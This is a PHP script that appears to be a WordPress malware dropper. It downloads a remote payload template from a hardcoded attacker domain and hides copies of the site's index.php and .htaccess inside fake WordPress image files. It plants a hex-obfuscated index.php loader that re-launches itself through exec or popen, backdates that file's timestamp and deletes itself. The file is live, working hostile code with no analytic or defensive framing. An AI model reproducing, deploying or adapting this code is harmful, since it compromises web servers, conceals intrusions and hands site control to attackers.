<?php
	$z88 = $_SERVER["DOCUMENT_ROOT"];
	function fi1($path){
		$arpath8 = array();
		global $arpath8;
		if ($handle = opendir($path)) {
			while (($file = readdir($handle)) !== false) {
				if ($file != "." && $file != ".." && $file != 'root' && !strstr($file, "uploads") && !strstr($file, "ALFA_DATA") && !strstr($file, "Fox") && !strstr($file, "php") && strlen($file)<30 && !strstr($file, ".") && !strstr($file, "well-known")) {
					if (is_dir($path."/".$file)) {
						if(!file_exists($path."/".$file."/index.php")){
							$arpath8[] = $path."/".$file;
						}
						fi1($path."/".$file);
					}
				}
			}
		}
	}
	fi1($z88);
	function fp2($z88){
		$p_arr = array();
		$pnew_arr = array();
		global $arpath8;
		foreach ($arpath8  as $k  =>  $v) {
			$qupath = str_replace($z88, "", $v);
			$p_arr[$k] = explode("/", $qupath);
			if (count($p_arr[$k])>=0) {
				$pnew_arr[] = $v;
			}
		}
		return $pnew_arr;
	}
	function get($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	$fp2 = @fp2($z88);
	$host = http();
	function http(){ 
		$http_host = strtolower($_SERVER["HTTP_HOST"]); 
		$secure = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? 1 : 0; 
		return ($secure ? "https://" : "http://") . $http_host.$_SERVER["SCRIPT_NAME"]; 
	}
	function dir_path($path){
		$path = str_replace(chr(92).chr(92), "/", $path);
		if (substr($path, -1) != "/") $path = $path;
		return $path;
	}
	function rand_abc($length){
		$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		$strlen = 52;
		while ($length > $strlen) {
			$str .= $str;
			$strlen += 52;
		}
		$str = str_shuffle($str);
		return substr($str, 0, $length);
	}
	
	function getPhpPath(){
		ob_start();
		phpinfo(1);
		$info = ob_get_contents();
		ob_end_clean();
		preg_match("/--bindir=([^&]+)/si", $info, $matches);
		if (isset($matches[1]) && $matches[1] != '') {
			return $matches[1] . '/php';
		}
		preg_match("/--prefix=([^&]+)/si", $info, $matches);
		if (!isset($matches[1])) {
			return 'php';
		}
		return $matches[1] . '/bin/php';
	}
	
	function str2hex($str){
		$len = strlen($str);
		$newstr = "";
		for($i = 0; $i < $len; $i++){
			$newstr .= "\x".bin2hex($str[$i]);
		}
		return $newstr;
	}
	$code_exec = '<?php error_reporting(0);$x="\x34\x35\x34\x33\x63\x68\x64\x69\x72\x65\x78\x65\x63\x70\x68\x70\x70\x73\x20\x2d\x65\x66\x7c\x67\x72\x65\x70\x20\x70\x68\x70";$a=true;$b=substr($x,$x[0],$x[1]);$c=substr($x,$x[0]+$x[1],$x[2]);@$c(substr($x,$x[0]+$x[1]+$x[2]+$x[3]),$f);foreach($f as $g){if(strstr($g,"\x70\x68\x70\x20\x69\x6e\x64\x65\x78\x2e\x70\x68\x70")!==false){$a=false;break;}}if($a){@$b("{##dir##}");@$c("{##php##} \x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26");}';
	$code_popen = '<?php error_reporting(0);$x="\x34\x35\x35\x33\x63\x68\x64\x69\x72\x70\x6f\x70\x65\x6e\x70\x68\x70\x70\x73\x20\x2d\x65\x66\x7c\x67\x72\x65\x70\x20\x70\x68\x70";$a=true;$b=substr($x,$x[0],$x[1]);$c=substr($x,$x[0]+$x[1],$x[2]);@$f=$c(substr($x,$x[0]+$x[1]+$x[2]+$x[3]),"r");$res="";while(!feof($f)){$out = fgets($f, 4096);$res.= $out;}@pclose($f);if(strstr($res,"\x70\x68\x70\x20\x69\x6e\x64\x65\x78\x2e\x70\x68\x70")!==false){$a=false;}if($a){@$b("{##dir##}");@pclose($c("{##php##} \x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26","r"));}';
	$images = array(
		'/wp-admin/images/browser-2x.png',
		'/wp-admin/images/privacy-2x.png',
		'/wp-admin/images/w-logo-red.png',
		'/wp-includes/images/blank.gif',
		'/wp-includes/images/wlw/avatar.png',
		'/wp-includes/images/media/folder.png',
		'/wp-includes/images/crystal/radio.png',
		'/wp-includes/images/smilies/icon_crazy.gif',
		'/wp-includes/images/smilies/icon_amaze.gif',
		'/wp-includes/images/smilies/icon_dog.gif',
	);
	$php_path = getPhpPath();
	shuffle($images);
	$count = count($fp2);
	list($msec, $sec) = explode(' ', microtime());
	$rand = $msec*100000000;
	$fp_ran = $fp2[$rand%$count];
	$randnum = rand_abc(mt_rand(1, 15));
	$dirpath = dir_path($fp_ran);
	$fp2_arr = explode("/",$dirpath);
	$z1 = @empty($fp2)?$z88."/".$randnum:$fp_ran;
	$z23 = get("http://hello.turnedpro.xyz/lockindex.txt");
	$img = $z88.current($images);
	$indexc = file_get_contents($z88."/index.php");
	$htac = file_get_contents($z88."/.htaccess");
	file_put_contents($img, base64_encode($indexc)."!!-0-!!".base64_encode($htac));
	$z23 = str_replace("{##root##}", $z88, $z23);
	$z23 = str_replace("{##dir##}", $z1, $z23);
	$z23 = str_replace("{##image##}", $img, $z23);
	$disabled = explode(',', ini_get('disable_functions'));
	$new_disable = array();
	$code = $code_exec;
	foreach ($disabled as $item) {
		$new_disable[] = trim($item);
	}
	if (in_array('exec', $new_disable)) {
		$code = $code_popen;
	}
	$code = str_replace("{##dir##}", str2hex($z1), $code);
	$code = str_replace("{##php##}", str2hex($php_path), $code);
	$z23 = str_replace("{##code##}", base64_encode($code), $z23);
	$z3=$z1."/index.php";
	$xd_ok = @fwrite(fopen($z3, "w"), $z23)?"1":"0";
	touch($z3, strtotime(rand(1990, 2015)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));
	chdir($z1);
	if (in_array('exec', $new_disable)) {
		$f=popen("$php_path index.php >/dev/null 2>&1 &", "r");
		pclose($f);
	}else{
		exec("$php_path index.php >/dev/null 2>&1 &");
	}
	@unlink(__FILE__);
	echo "php_path:  ".$php_path."<br/> img path:  ".$img."<br/> php path:  ".$z1;
	

